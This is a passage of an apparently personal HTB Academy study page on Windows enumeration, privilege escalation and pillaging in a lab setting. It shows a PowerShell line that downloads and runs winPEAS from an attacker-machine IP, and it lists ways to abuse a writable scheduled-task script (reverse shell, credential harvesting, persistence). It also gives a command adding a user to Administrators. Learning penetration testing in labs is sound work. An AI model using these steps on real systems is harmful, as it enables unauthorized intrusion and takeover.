class="token-line" style="color:#393A34"><span class="token plain">BUILTIN\\Event Log Readers            Alias            S-1-5-32-573 Mandatory group, Enabled by default, Enabled group</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BUILTIN\\Remote Desktop Users         Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BUILTIN\\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NT AUTHORITY\\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NT AUTHORITY\\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NT AUTHORITY\\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NT AUTHORITY\\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NT AUTHORITY\\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mandatory Label\\High Mandatory Level Label            S-1-16-12288</span><br></span></code></pre></div></div>
<p>We can use <code>net</code> command as well:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\john&gt; net user john</span><br></span></code></pre></div></div>
<p>We can check scheduled tasks:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\john&gt; schtasks /query /fo LIST /v</span><br></span></code></pre></div></div>
<p>Similar to linpeas, it exists the winpeas script. We can run it without touching the disk with:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\john&gt; powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#x27;http://&lt;attacking-machine-IP&gt;:8080/winPEAS.ps1&#x27;)&quot; &gt; winpeas.txt</span><br></span></code></pre></div></div>
<p>This will list write permissions in unsual places, open ports, user information (SID, groups and privileges) and system information.</p>
<p>To check permissions on files, we can use <code>icacls</code>, it manages NTFS file system permissions, specifically the discretionary access control lists (DACLs), allowing administrators to view, modify, grant, deny, or remove permissions on files and directories:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\\ProgramData&gt; icacls &quot;C:\\ProgramData\\CorpBackup\\Scripts\\backupprep.ps1&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\\ProgramData\\CorpBackup\\Scripts\\backupprep.ps1 Everyone:(I)(F)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                 NT AUTHORITY\\SYSTEM:(I)(F)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                 BUILTIN\\Administrators:(I)(F)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                 BUILTIN\\Users:(I)(RX)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Successfully processed 1 files; Failed processing 0 files</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="windows-privilege-escalation">Windows Privilege Escalation<a href="#windows-privilege-escalation" class="hash-link" aria-label="Direct link to Windows Privilege Escalation" title="Direct link to Windows Privilege Escalation">​</a></h2>
<p>Looks like we identified one scheduled task and we have write access to the script. We can perform:</p>
<ul>
<li>Script modification for code injection - Add a user to the administrators group and add a reverse shell</li>
<li>Credential harvesting - Dump credentials or use it as a keylogger</li>
<li>Persistence via task hijacking - Append code to maintain access by creating a new scheduled task that runs our payload frequently</li>
<li>Changing Passwords - Change administrator’s password and create a new RDP session as the user Administrator</li>
</ul>
<p>Since the script is executed with <code>Administrator</code> permission, we can use it to add the user to administrators group:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;WIN01\\john&quot;</span><br></span></code></pre></div></div>
<p>Now, we wait two minutes and the user will be in the <code>Administrators</code> group.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="windows-pillaging">Windows Pillaging<a href="#windows-pillaging" class="hash-link" aria-label="Direct link to Windows Pillaging" title="Direct link to Windows Pillaging">​</a></h2>
<p>Now, we can run <code>winpeas</code> script and will output some information that before was not accessible. Also there&#x27;s the <code>winpill.ps1</code> script that will automate retrieval of interesting data.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="proof-of-concept">Proof-of-Concept<a href="#proof-of-concept" class="hash-link" aria-label="Direct link to Proof-of-Concept" title="Direct link to Proof-of-Concept">​</a></h2>
<p>We can summarize the process of a pentest in the following steps:</p>
<ul>
<li>Information Gathering</li>
<li>Vulnerability Assessment</li>
<li>Exploitation</li>
<li>Local Information Gathering</li>
<li>Local Vulnerability Assessment</li>
<li>Post-Exploitation (Privilege Escalation)</li>
<li>Privileged Local Information Gathering (Pillaging)</li>
<li>Privileged Local Vulnerability Assessment</li>
</ul></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/Hacking/HTB Academy/Linux fundamentals"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Linux fundamentals</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/Hacking/HTB Academy/SQL injections"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">SQL injections</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#linux-information-gathering" class="table-of-contents__link toc-highlight">Linux information gathering</a></li><li><a href="#linux-system-enumeration" class="table-of-contents__link toc-highlight">Linux System enumeration</a></li><li><a href="#linux-privilege-escalation" class="table-of-contents__link toc-highlight">Linux Privilege Escalation.</a></li><li><a href="#linux-pillaging" class="table-of-contents__link toc-highlight">Linux pillaging</a></li><li><a href="#windows-information-gathering" class="table-of-contents__link toc-highlight">Windows information gathering</a></li><li><a href="#windows-system-enumeration" class="table-of-contents__link toc-highlight">Windows System Enumeration</a></li><li><a href="#windows-privilege-escalation" class="table-of-contents__link toc-highlight">Windows Privilege Escalation</a></li><li><a href="#windows-pillaging" class="table-of-contents__link toc-highlight">Windows Pillaging</a></li><li><a href="#proof-of-concept" class="table-of-contents__link toc-highlight">Proof-of-Concept</a></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>